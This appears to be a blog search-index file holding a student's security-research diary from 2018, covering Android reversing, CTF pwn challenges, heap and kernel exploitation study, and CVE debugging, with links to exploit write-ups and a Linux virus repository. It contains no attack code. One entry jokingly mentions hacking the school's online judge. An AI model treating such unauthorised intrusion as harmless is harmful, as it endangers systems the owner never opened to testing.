<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Sakuraのdiary</title>
      <link href="/2099/09/18/study/"/>
      <url>/2099/09/18/study/</url>
      <content type="html"><![CDATA[<h2 id="2018-1-28"><a href="#2018-1-28" class="headerlink" title="2018-1-28"></a>2018-1-28</h2><p>1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）<br>2.配置shadow<br>尝试用gdb和gdbserver来调试<br><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a><br><a href="https://developer.android.com/ndk/downloads/index.html?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads/index.html?hl=zh-cn</a><br><a href="http://kiya.studio/2017/06/21/android-gdb/" target="_blank" rel="noopener">http://kiya.studio/2017/06/21/android-gdb/</a><br>shadow文档的几个坑点</p><ul><li>arm-linux-androideabi-gdb，也就是gdb-arm版没有提供，要自己找，我装了一个ndk r10e，然后弄了一个，嗯，r11移除了gdb。</li><li>在gdb remote之前，文档里没有写forward转发，导致我试的时候一直refuse</li></ul><p>3.晚上最大的收获是看到了一个不错的blog（android逆向CTF）<br><a href="http://kiya.studio/2333/03/03/android-reversing-skills/#more" target="_blank" rel="noopener">http://kiya.studio/2333/03/03/android-reversing-skills/#more</a></p><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018-1-29"></a>2018-1-29</h2><ol><li>看玄武的<a href="https://mp.weixin.qq.com/s/mOaXkGTY2704P6TV2KBvwg" target="_blank" rel="noopener">每日安全推送</a>，主要看了WinAFL</li><li>nexus5被我刷成砖……然后顺手把刷机、root和装xposed全都整理了一遍。</li><li>webkit的poc断点找到了，可以调了</li><li>做了一道阿里CTF第二题，一道关于反调试的题。</li></ol><h2 id="2018-1-31"><a href="#2018-1-31" class="headerlink" title="2018-1-31"></a>2018-1-31</h2><ol><li>看AI直播调webkit，感觉调浏览器好难呀。</li><li>看玄武的<a href="https://mp.weixin.qq.com/s/M4QZxs_G-lZ810o_i2KJhA" target="_blank" rel="noopener">每日安全推送</a>，主要关注了反调试和使用Strava 热力图来推断军事基地位置，很有趣的思路。</li><li>研究了一下加固原理和脱壳基础：dvmDexFileOpenPartial，还挺简单的。</li><li>研究了ptrace和调试器原理，了解了ptrace反调试的一些技巧</li></ol><h2 id="2018-2-1"><a href="#2018-2-1" class="headerlink" title="2018-2-1"></a>2018-2-1</h2><ol><li>本来想今天研究一下ndk编译的，不过睡着了……然后也没看什么东西</li><li>帮学弟解决了一些搭建博客的bug，顺便自己把博客的主题配色，代码高亮，搜索，评论什么的都修改或添加了，好看多了……</li></ol><h2 id="2018-2-2"><a href="#2018-2-2" class="headerlink" title="2018-2-2"></a>2018-2-2</h2><ol><li>看玄武的<a href="https://xuanwulab.github.io/cn/secnews/2018/02/02/index.html" target="_blank" rel="noopener">每日安全推送</a></li><li>钓鱼网站那个很有趣，我就测试了一下，然后因为ss代理不走终端，找了<a href="https://juejin.im/entry/5821840cd203090055134cc0" target="_blank" rel="noopener">一篇文章</a>和<a href="https://blog.kelu.org/tech/2017/07/06/parallels-vm-use-proxy-with-host-on-mac.html" target="_blank" rel="noopener">另一篇文章</a>，配置了一下就好了~</li><li>自己实践了一下那个钓鱼工具，实践文章和终端那个都可以在”杂项”分类里找到</li><li>研究了一下怎么用ndk-build编译一个能在手机上运行的c程序，这样明天就可以尝试hook了</li></ol><h2 id="2018-2-3"><a href="#2018-2-3" class="headerlink" title="2018-2-3"></a>2018-2-3</h2><ol><li>今天没有玄武的推送看~</li><li>研究了android native层hook，算是学到不少东西了。</li></ol><h2 id="2018-2-4"><a href="#2018-2-4" class="headerlink" title="2018-2-4"></a>2018-2-4</h2><ol><li>写了第一个xposed程序~遇到了一些坑，不过还是趟过去了。</li><li>修改nexus5的boot.img,打开系统调试，又坑了我一会。。</li></ol><h2 id="2018-2-5"><a href="#2018-2-5" class="headerlink" title="2018-2-5"></a>2018-2-5</h2><ol><li>今天出去怠惰了（茶）</li><li>xposed继续学习了一下，学会了一些姿势，感觉还是不错的~</li></ol><h2 id="2018-2-6"><a href="#2018-2-6" class="headerlink" title="2018-2-6"></a>2018-2-6</h2><ol><li>研究了怎么搭建shadowsocks服务端和优化</li><li>自己写了一个基于flask的B/S端口扫描器，代码太难看就不放了（茶</li></ol><h2 id="2018-2-7"><a href="#2018-2-7" class="headerlink" title="2018-2-7"></a>2018-2-7</h2><ol><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/FM-mZh1e8YQP0MWrV1IlVw" target="_blank" rel="noopener">2.6</a>和<a href="https://mp.weixin.qq.com/s/2JMrsyyuTErVy-pXRoL3Jg" target="_blank" rel="noopener">2.7</a><br>wordpress DOS有点意思，不过没搞懂，另外主要看了android安全公告2月版，看懂了一些（限于原理），开发太菜了。</li><li>学习了android的jni开发，基本的都摸了一遍。</li></ol><h2 id="2018-2-8"><a href="#2018-2-8" class="headerlink" title="2018-2-8"></a>2018-2-8</h2><ol><li>继续昨天的jni学习，摸清了native方法的动态注册</li><li>研究了下.init_array,结合jni动态注册，做了一道CTF题</li><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/sqPmC-z-HiH4UKArE1Gdgw" target="_blank" rel="noopener">2.8</a>,这篇<a href="https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html" target="_blank" rel="noopener">钓鱼</a>的有趣</li><li>给AI写了个爬页面上文件的爬虫。</li></ol><h2 id="2018-2-9"><a href="#2018-2-9" class="headerlink" title="2018-2-9"></a>2018-2-9</h2><ol><li>研究android构建过程，Gradle工作流程</li><li>读玄武每日推送（存了个移动端静态分析的github准备好好看看）</li></ol><h2 id="2018-2-10"><a href="#2018-2-10" class="headerlink" title="2018-2-10"></a>2018-2-10</h2><ol><li>研究Dex文件格式和修复</li><li>学习了用ddms来dump出运行内存做题的技巧。</li><li>学习了新建android工程，调so文件解题。</li></ol><h2 id="2018-2-11"><a href="#2018-2-11" class="headerlink" title="2018-2-11"></a>2018-2-11</h2><ol><li>把昨天看到一道递归算法的android re做了，感觉现在做一般的CTF都有点思路了，做看雪的还是GG，还要提高姿势水平。</li><li>今天上午看到我在知乎的提问有师傅回答我了：<a href="https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。" target="_blank" rel="noopener">https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。</a></li><li>今天下午做完题就又瞎看了一会，思考我是不是选错了方向……android的调试贼麻烦，资料还贼少，看了看看雪，主要是浏览器、文件格式和内核，虽然其实都一样的，那些资料也不多，没法挖洞的……认识的dalao又少，没法充分交流QAQ，唉，感觉我是不是不适合当黑客，看vulcan的师傅微博，月月一大批CVE，就我什么都挖不到，不过今晚看了看师傅们的博客，他们的心路历程给了我很大勇气，是的，我早就不打算退后了，只有前进而已。</li></ol><h2 id="2018-2-12"><a href="#2018-2-12" class="headerlink" title="2018-2-12"></a>2018-2-12</h2><ol><li>今天刷空间看到moctf比赛，就参加了下，把android/linux re做掉就没看了。</li><li>依然很迷茫，不过其实想想，我开始学二进制，其实也就不到半年，进步速度并不是不能接受，只是在技能进阶上卡住了又没人交流而已，嗯，再想想好了。</li></ol><h2 id="2018-2-13到19"><a href="#2018-2-13到19" class="headerlink" title="2018-2-13到19"></a>2018-2-13到19</h2><ol><li>这些天几乎都过年去了……然后唯一做了点事就是把自己的课程设计做了，<a href="https://github.com/eternalsakura/PortScan" target="_blank" rel="noopener">PortScan</a></li><li>新年新气象，最近家里的事情也是乱七八糟，能多学点赚钱的技术分担压力就好了。</li><li>下学期的计划——fuzz、CVE漏洞研究、前端后端的一些Web开发（写点相关项目练手），然后找实习。</li><li>学会了一项新的运动，保龄球，很有意思。</li><li>最近一直什么都没学，自己也在反思一些东西，寻找一个前进的点。<br>比如浏览器，文件格式，还是内核，或者其他，还是都不是。<br>安全只是个抽象的概念，具体化了才能变成业务。<br>我还需要探究一段时间，读很多的漏洞分析文章，追随前辈们走过的路途，再进一步反思。<br>“一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&gt; exploitable bug(vulnerability) –&gt; poc –&gt; exploit –&gt; reliable/weaponized exploit。虽然大家都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但我们真正关心的漏洞应该是能到最后两个阶段的vulnerability。”</li></ol><h2 id="2018-2-20到21"><a href="#2018-2-20到21" class="headerlink" title="2018-2-20到21"></a>2018-2-20到21</h2><ol><li>返校真是艰难……飞机火车客车出租全都转了一遍才到……</li><li>晚上收拾了下房间，看了看看雪，发现师傅做的有趣CTF题，<a href="https://bbs.pediy.com/thread-224686.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224686.htm</a></li><li>群里在讨论内存管理和hook，被推荐了一本腾讯的手游安全的书《游戏安全：手游安全技术入门》，还不错，可以入个门……</li><li>看到一个博客提供了一些自定义ROM的资料，最近也想改，看到了就记录一下。<a href="https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338" target="_blank" rel="noopener">https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338</a></li></ol><h2 id="2018-2-22"><a href="#2018-2-22" class="headerlink" title="2018-2-22"></a>2018-2-22</h2><ol><li>看了《手游安全技术那本书》，学习了注入技术。</li><li>下午买了考虫的口语能力提升班，然后学习了下</li><li>晚上在seebug逛，找各种二进制漏洞分析的资料，然后看到了陈良的ppt,remet的github,韩子诺的文章，还有很多很多……CVE-2014-7911感觉可以调调，我得整理整理我搜的资料，然后按照原理-&gt;漏洞分析-&gt;exp去学习w</li></ol><h2 id="2018-2-23到25"><a href="#2018-2-23到25" class="headerlink" title="2018-2-23到25"></a>2018-2-23到25</h2><ol><li>是的，仔细算算，我已经编译AOSP编译了三天了，而且还没编译好……现在已经基本放弃在mac上编译了，我现在突然想,flanker大神之所以用ubuntu做主力机……是不是因为在mac上编译不出AOSP呀……(逃)</li><li>明天在旧电脑上装win/ubuntu的双系统，要不是因为这学期有win网络编程和c#开发……我就直接烧ubuntu进去了（撑脸</li><li>嗯，不用明天了，在今天的收尾……新学期的开始……我终于是守得云开见月明，把AOSP弄出来了！</li></ol><h2 id="2018-2-26"><a href="#2018-2-26" class="headerlink" title="2018-2-26"></a>2018-2-26</h2><ol><li>学习了stack pivot，<a href="http://tacxingxing.com/2017/05/10/stack-pivot/" target="_blank" rel="noopener">劫持栈指针</a></li><li>学习了heap spray,<a href="http://secwiki.neu.edu.cn/wiki/images/f/fe/%E5%86%85%E5%AD%98%E5%96%B7%E5%B0%84%E5%9C%A8%E5%AE%89%E5%8D%93Root%E5%88%A9%E7%94%A8%E4%B8%AD_%E9%99%88%E8%89%AF.pdf" target="_blank" rel="noopener">堆喷</a></li><li>学习了<a href="http://pwn4.fun/2016/11/20/C-虚函数调用攻防战/" target="_blank" rel="noopener">虚表攻防</a></li><li>了解android<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back.pdf" target="_blank" rel="noopener">root</a></li><li>Time-of-check Time-of-use (TOCTOU) Race Condition</li><li>今天还是认真的研究了一下之前没调出来的cve-2015-3864，因为这个漏洞有完整的利用链资料，非常的棒，虽然可能调不了什么的，但是理解这个利用过程也很有意义。<br>还是要感谢一下看雪师傅的<a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">文章</a>，还加了好友0.0，感觉要是我一开始就是编译的AOSP去调试……可能寒假就调出来了2333，反正感觉今天还是很有收获的。</li></ol><h2 id="2018-2-27"><a href="#2018-2-27" class="headerlink" title="2018-2-27"></a>2018-2-27</h2><ol><li>一上午调了道64位rop，还没调出来..exm???是这题的错还是我的错…多看看别人的exp好了，以前还是做题不够，积累不够。</li><li>继续看stagefright好了，争取今天多少调一调。</li><li>好吧，没看进去，gp0的exp大致看懂了，不过metaphor的思路还是费解，可能我现在的理解力还是不够。</li><li>下午一直在整理之前看的ptmalloc的一些基本概念，虽然意义不是很大，但是理一理总是好的，还是要为ctf-wiki打call，里面写了非常多的干货，明天继续整理。</li></ol><h2 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h2><ol><li>体育课累死……密码学数学基础有趣。</li><li>今天把heap exploit的unlink整理了一下，虽然最后那个例子有点问题，我换了两个系统都没成功，但是原理还是理清了，真的是都快忘了……</li></ol><h2 id="2018-3-1"><a href="#2018-3-1" class="headerlink" title="2018-3-1"></a>2018-3-1</h2><ol><li>又混了篇看雪的优秀，感觉还是蛮有成就感的，自己发的文章都不是优秀就是精品。</li><li>今天有点怠惰呢，明天要继续努力。</li></ol><h2 id="2018-3-2"><a href="#2018-3-2" class="headerlink" title="2018-3-2"></a>2018-3-2</h2><ol><li>今天一天都在整理fastbin的一个内容（其实还玩了一会Web，黑掉学校OJ嘿嘿嘿）</li><li>这道赛题略难，然后跟团队练习赛的PragyanCTF，感觉这赛题像是file io啊。。谁出的题这么皮。。</li></ol><h2 id="2018-3-3"><a href="#2018-3-3" class="headerlink" title="2018-3-3"></a>2018-3-3</h2><ol><li>生日快乐~自己，去订了蛋糕，今天继续研究了一下那个fastbin的题，真的很难。。</li><li>把android kernel也编译了出来，这次真的是可以调了。。</li></ol><h2 id="2018-3-4"><a href="#2018-3-4" class="headerlink" title="2018-3-4"></a>2018-3-4</h2><ol><li>今天和实验室大一的聊了下，然后把我能知道的东西，方向什么的，都聊了一下。</li><li>9447 CTF 2015的fastbin是真的难……我还是不懂，算了算了，明天看点别的吧，这个todo。</li><li>今天和一个师傅聊了下IoT漏洞应该怎么挖，受益匪浅，但是转换为具体的硬实力还需要多看多学多调。</li></ol><h2 id="2018-3-5"><a href="#2018-3-5" class="headerlink" title="2018-3-5"></a>2018-3-5</h2><ol><li>今天把那道fastbin的题认真的理了理，其实也不是很难，然后又把pragyan ctf2018的两道pwn题做了一下，第一道还好，那个目录遍历没理解上，看了wp会了，第二道就有点迷，静态链接下的格式化字符串漏洞，没办法覆盖got表，看了一篇wp是覆盖malloc_hook，这不是我白天看的那道fastbin的套路么……真的是……然后打开栈执行，这……真是脑洞，又感觉自己很菜……</li><li>嗯w，文章又被看雪推送了，还是感觉蛮不错的……希望能认识更多人吧w，今天看了看玄武每日推送的目录，非常nice，准备找个时间把这段时间没看的都啃一下。</li></ol><h2 id="2018-3-6"><a href="#2018-3-6" class="headerlink" title="2018-3-6"></a>2018-3-6</h2><ol><li>上周的比赛，搞到今天总算是大致调完了，就只剩一个点不懂，也是实在搞不懂了，教主说的很有道理，只有把文章写成博客，发出去，才能检验你到底对这个东西的理解怎么样，事实上，也只有在学习中的我，才会如此详细的写wp吧。</li></ol><h2 id="2018-3-7-8"><a href="#2018-3-7-8" class="headerlink" title="2018-3-7-8"></a>2018-3-7-8</h2><ol><li>这两天把漏洞战争的环境大致搭了一下，从用windbg到看到符号，还是折腾了一下。</li></ol><h2 id="2018-3-9-10"><a href="#2018-3-9-10" class="headerlink" title="2018-3-9-10"></a>2018-3-9-10</h2><ol><li>调了一下漏洞战争堆的第一个binary，然后熟悉了一下工具使用，还是nice.</li><li>调了cve-2012-1876的poc，发现了一些书上没有提到的地方和一个错误，就不提勘误了…都出了这么久了…原理差不多懂了，很有趣。</li><li>今天有意想不到的收获，或者说机会吧，希望我能把握好，然后做好安全研究，成为一个优秀的黑客。</li><li>列一个CVE调试计划吧，目前进度1/10<br>浏览器<br>3.7 CVE-2012-1876,堆溢出（p2o ie9)<br>4.3 CVE-2011-0027,整数溢出漏洞 (p2o ie8)<br>4.6 CVE-2013-2551,整数溢出漏洞(p2o ie10)<br>7.4 CVE-2013-1347,UAF(ie)<br>android<br>10.7 CVE-2014-3153 anroid kernel提权</li></ol><h2 id="2018-3-11-12"><a href="#2018-3-11-12" class="headerlink" title="2018-3-11-12"></a>2018-3-11-12</h2><ol><li>这两天进度比较低迷，第一天直接莽上去调exp然后被打脸…今天把vupen的文章仔细读了一遍，把整个利用过程理解了一下。</li><li>说来有个有趣的点，p2o之后cve-2012-1876不是应该补了么，怎么在win8+ie10上还能利用，更有趣的是vupen明明用这个洞getshell了ie9，但是为什么keen在Study of Exploit Migitation in Modern Browsers这个ppt上说了bstr的分配不再能被利用，那vupen到底是怎么写的exp…</li><li>最近的计划（才怪…</li></ol><ul><li>编译的前端后端</li><li>kernel的漏洞</li><li>看diff写poc…</li></ul><h2 id="2018-3-13-14"><a href="#2018-3-13-14" class="headerlink" title="2018-3-13-14"></a>2018-3-13-14</h2><ol><li>密码学数学基础和算法这些课也就算了，晚上还有软件开发的课，各种文档什么的…能不能好好lu代码，把之前写的项目project答辩完了。</li><li>等到了想等的结果，收心认真学习了。</li><li>晚上把计算机系统素养里的部分内容（VM）又看了一下，十分有意义。</li><li>为了学编译原理，先自己lu一个c语言解释器了解个大概吧。</li></ol><h2 id="2018-3-15-17"><a href="#2018-3-15-17" class="headerlink" title="2018-3-15-17"></a>2018-3-15-17</h2><ol><li>这几天把write a c interpret看完了，大致了解了编译器前后端，当然肯定现在还是不会写的。</li><li>调cve-2012-7864,虽然称不上调通exp，但是大部分都调出来了，poc调的很顺利，在exp就处处踩坑。</li><li>说来好像webkit的dom的堆被分开了，以后就不会有那么多uaf了。</li></ol><h2 id="2018-3-18-20"><a href="#2018-3-18-20" class="headerlink" title="2018-3-18-20"></a>2018-3-18-20</h2><ol><li>日记还是要每天记……都忘了自己每天做了什么了……把c++的project做完了，做了两道pwn题。</li><li>看了一下LCTF2017的题目,large bin的unlink确实没练过，还有一道simpleVM改的题，都做做好了。</li></ol><h2 id="2018-3-21-25"><a href="#2018-3-21-25" class="headerlink" title="2018-3-21-25"></a>2018-3-21-25</h2><p>lctf2017的题目里学到不少东西，另外关于堆利用的姿势实在是不足，此外无libc利用这个也要再学习一下。<br>这几天除了两个project写，还打了强网杯，感觉就是什么都不会吧。。可能不该死磕一道题，应该都看看？…啊啊啊，难受死了，离顶尖水平差的根本不是一点半点……<br>还看了一篇清华的论文，非常nice。<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1</a><br>还是有的挫败呢，离别人的水平。</p><h2 id="2018-3-26"><a href="#2018-3-26" class="headerlink" title="2018-3-26"></a>2018-3-26</h2><p>1.读玄武每日推送[<a href="http://chuansong.me/n/2253059751415" target="_blank" rel="noopener">http://chuansong.me/n/2253059751415</a>].</p><ul><li>mark一下<a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">windows kernel漏洞利用</a>，mark一下k0师傅的<a href="https://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>和360src的<a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">这篇</a>,看来调kernel还是有的调。</li><li>看到的<a href="https://github.com/sashs/arm_exploitation/blob/master/exploitation_on_arm_based_systems.pdf" target="_blank" rel="noopener">ARM exp开发</a>就很简略，感觉学不到什么东西。</li><li>mark一个超棒的<a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">linux kernel交互图</a>，还能在页面上点击跳转到资料<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-LKM3_2048.png" alt=""></li><li>还有一个Stack pivoting  exploit的图收了,不知道他们怎么画的图这么好看。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-030340.jpg" alt=""></li><li><a href="https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5a00963153450a8779b23489/1509987890282/Windows" target="_blank" rel="noopener">windows注册表审计</a>感觉以后用得到</li><li><a href="https://twitter.com/_niklasb/status/977141034059747328" target="_blank" rel="noopener">p2o的沙盒逃逸漏洞</a>这个感觉十分有意思。</li><li>blackhat上总有很多好议题，比如这个<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">绕过ASLR的新思路</a></li></ul><p>2.准备配linux kernel的调试环境，真的是……配不起来啊，双机调试，拉取符号文件，设置串口，改配置开启调试功能。rbq,rbq<br>3.加入了chamd5团队，有师傅一起学pwn，一起讨论真是太棒了QVQ</p><h2 id="2018-3-27"><a href="#2018-3-27" class="headerlink" title="2018-3-27"></a>2018-3-27</h2><ol><li><p>上午和出强网杯kernel题的师傅聊了一下kernel的调试环境搭建和赛题，师傅人蛮好。。<br>搭建的话，muhe师傅的<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85837</a><br><strong>编译linux 注意去掉不必要的东西，然后编译busybox 然后插入内核  写linux init 最后制作cpio</strong><br>这样就可以qemu+gdb调试了，很nice。</p></li><li><p>下午和晚上忙各种杂七杂八的事情反正……不过总算还是把要复盘的赛题做完了。</p></li><li>另外，感觉自己的努力和天赋还是被人肯定的，加油吧，自己QVQ。</li></ol><h2 id="2018-3-28"><a href="#2018-3-28" class="headerlink" title="2018-3-28"></a>2018-3-28</h2><ol><li>人生这种东西，其实就是起起落落落落落落落落落落落落落落落落落落落落落落落落落落落落，23333<br>瞎看了半天linux inside，还看了下linux x86-64 asm，感觉没什么进展。</li><li>晚上在知乎提了个问题，别人指了一条很nice的路线给我，还和其他人get了一点点资料，感觉我应该也是可以搞的吧，嗯哼。<br>其实今天一直比较浮躁，还是昨天晚上的一些后遗症吧，还有就是期望和现实的落差……<br>不过冷静的回想一下，不能让自己立刻从舒适区脱离，从新掌握新的知识，那怎么进步呢？且行且努力（乖巧</li></ol><h2 id="2018-3-29"><a href="#2018-3-29" class="headerlink" title="2018-3-29"></a>2018-3-29</h2><ol><li>这几天事挺多的，今天才把blackhat的ppt都下载下来,然后看了下<a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="noopener">linux符号解析</a>还发现了一个<a href="https://github.com/elfmaster/skeksi_virus" target="_blank" rel="noopener">正在开发中的linux病毒</a></li><li>收集了蛮多linux kernel资料慢慢啃……今天啃了两个ppt，纯英文的那么多……我也是很意外自己读起来没什么障碍的……<br>学什么都要一步一步呀，能调通一个，调试就没什么了，后面的学习速度就看对于kernel和保护的理解了。</li></ol><h2 id="2018-3-30-31"><a href="#2018-3-30-31" class="headerlink" title="2018-3-30-31"></a>2018-3-30-31</h2><ol><li>这两天发生的事情还蛮多的，最近发生的一些事让我觉得，自己调的真洞还是太少，调就要调出来还要能调通，不过说实话吧……浏览器和kernel的洞真的不好调，我学二进制又不久……现在比赛练pwn都来不及，还要分身调洞，确实有点难啊……</li><li>不过kernel的ppt啃了俩，感觉纯英文的资料也就那个样子了，读起来还是挺流畅的，要是真的不懂换成中文我也不懂……</li><li>把kernel题的环境搭起来了，有师傅请教真的是比自己搞好太多……另外堆的题感觉有感觉了，准备给自己一个比较长的训练周期，比如十天，彻底脑内模拟透，最近进步还是蛮多，加油。<br>mark一个师傅的<a href="http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">博客</a></li></ol><h2 id="2018-4-1-3"><a href="#2018-4-1-3" class="headerlink" title="2018-4-1-3"></a>2018-4-1-3</h2><ol><li>打了一场0ctf，感觉自己还是太菜，不过在师傅们的帮助下，把能搞懂的题都搞懂了，学到很多很多东西，还是很开心的。</li><li>写wp太麻烦了坦白说。。不过还是写吧，不写的话自己都不知道能记得多久……</li></ol><h2 id="2018-4-4-11"><a href="#2018-4-4-11" class="headerlink" title="2018-4-4-11"></a>2018-4-4-11</h2><ol><li>这几天电脑键盘坏了，电脑送修什么都没干。下了个吃鸡手游，嗯，还挺好玩的，今天早上电脑到了删了。</li><li>把0ctf2018的4道pwn复盘完了，折腾kernel调试环境。。还是挺麻烦的。</li><li>想要的很简单，得到却很难，好想去实验室做安全研究。</li></ol><h2 id="2018-4-12"><a href="#2018-4-12" class="headerlink" title="2018-4-12"></a>2018-4-12</h2><ol><li>今天从qemu+gdb，各种花式报错，到搭建内核的双机调试，简直了……总算最后是勉强在win机器上弄好了。<br>今天得到的一个启发是，先找一个可以用的方案去做，不要想什么一次做到最好，到有机会再换方案。</li><li>英语作业还没做……唉……赶作业赶作业……</li></ol><h2 id="2018-4-13"><a href="#2018-4-13" class="headerlink" title="2018-4-13"></a>2018-4-13</h2><ol><li>今天也是一堆事情，睡到中午然后开始做ddctf，那个逆向的mips还有android逆向的RSA，pwn的win kernel exploit真的是有、意思。反正我不想做了，不如学习一个<a href="https://blog.betamao.me/2018/02/26/ptmalloc%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新姿势</a></li><li>linux kernel调试的环境算是彻底搭好了，今天解决了两个昨天没解决的bug，已经可以看到源码了。</li></ol><h2 id="2018-4-14-15"><a href="#2018-4-14-15" class="headerlink" title="2018-4-14-15"></a>2018-4-14-15</h2><ol><li>解决了内核不能单步调试的问题，然后在复习信安数学了。。再不看要凉了</li><li>仔细跟了一下poc，感觉还是能看懂的。</li></ol><h2 id="2018-4-16-17"><a href="#2018-4-16-17" class="headerlink" title="2018-4-16-17"></a>2018-4-16-17</h2><ol><li>自己看了下日记，4月除了修电脑配环境，几乎什么都没做，这段时间心态太浮躁了，嗯，加个太，也要准备投几家实习了，本来以为可以拿到的offer，都感觉凉了，不过算了，我是要去实验室做安全研究的人呢。</li><li>分析了cve-2017-8890的漏洞成因和模型还有patch</li></ol><h2 id="2018-4-18"><a href="#2018-4-18" class="headerlink" title="2018-4-18"></a>2018-4-18</h2><ol><li>今天也是一堆的课，晚上和师傅们聊天聊八卦去了。。结果只把UAF对象的分配和释放调了调。</li><li>了解了一下实验室面试啥的，要好好调CVE了。</li></ol><h2 id="2018-4-19"><a href="#2018-4-19" class="headerlink" title="2018-4-19"></a>2018-4-19</h2><ol><li>看了看师傅们的面试题，觉得其实自己还能再抢救一下。。</li><li>今天看了长亭的kernel的洞，感觉分析成因还是很好分析的…但是exp调起来麻烦，也懒得写博客记录了，今天把webkit的调试记录了一下，明明好久之前就搞了，结果到现在还是这样没什么进展（茶</li></ol><h2 id="2018-4-20-21"><a href="#2018-4-20-21" class="headerlink" title="2018-4-20-21"></a>2018-4-20-21</h2><ol><li>编了一天v8，搞不出来，墙真讨厌。</li><li>调（看）了一个webkit的UAF漏洞，还行，感觉最难懂的还是对象之间的引用关系太复杂，还有就是回调函数跟着跟着容易找不到自己在哪。<br>“我是谁，谁在打我。”（逃）</li></ol><h2 id="2018-4-22-24"><a href="#2018-4-22-24" class="headerlink" title="2018-4-22-24"></a>2018-4-22-24</h2><ol><li>打了一场*ctf，又学到了新姿势。</li><li>在看v8，看JIT，看R大的回答，xjb搜文章，还是不错。</li><li>调通了p2o的一个v8的oob的洞，cve-2017-5053,还是不难。</li></ol><h2 id="2018-4-25-28"><a href="#2018-4-25-28" class="headerlink" title="2018-4-25-28"></a>2018-4-25-28</h2><ul><li><p>补一些浏览器的基础吧</p></li><li><p>学习了一下一个新的内核洞，有新的trick总结</p></li><li>最近觉得该搞搞利用了，路由器固件也可以玩一下，安全研究这么有趣，什么都能摸一下（才怪</li></ul><h2 id="2018-4-29-30"><a href="#2018-4-29-30" class="headerlink" title="2018-4-29-30"></a>2018-4-29-30</h2><ol><li>国赛打完了，各种不走心，状态奇差，混进赛区半决赛了，CTF也玩到这了吧先，后面好好研究浏览器。</li><li>看了Natalie Silvanovich写的How to Find JavaScript Vulnerabilities with Code Review</li></ol><ul><li>Determine intended functionality</li><li>Review implementation of important features</li><li>Review previously reported bugs</li><li>Brainstorm likely vulnerable areas</li><li>Review code!<br>Mozilla docs (MDN) is a great start for JS</li></ul><ol><li>想翻一些议题视频看的时候翻到了一个仓库，js vul的，存一下，<a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">js-vuln-db</a></li></ol><h2 id="2018-4-31-5-2"><a href="#2018-4-31-5-2" class="headerlink" title="2018-4-31-5.2"></a>2018-4-31-5.2</h2><ol><li>看了一个js optimized code<a href="https://www.microsoft.com/en-us/research/video/chakra-script-optimized-code/" target="_blank" rel="noopener">视频</a>，虽然是chakra的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-074634.png" alt=""><br>不过感觉，有点没用…这些我都知道（</li><li>看v8的gc,利用和各种，反正还是挺迷的，先看吧QVQ</li><li>看到一幅很棒的图，新的v8的执行图？<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-151804.jpg" alt=""></li><li>看webkit技术内幕找灵感，看洞有点看不明白了。</li></ol><h2 id="2018-5-3"><a href="#2018-5-3" class="headerlink" 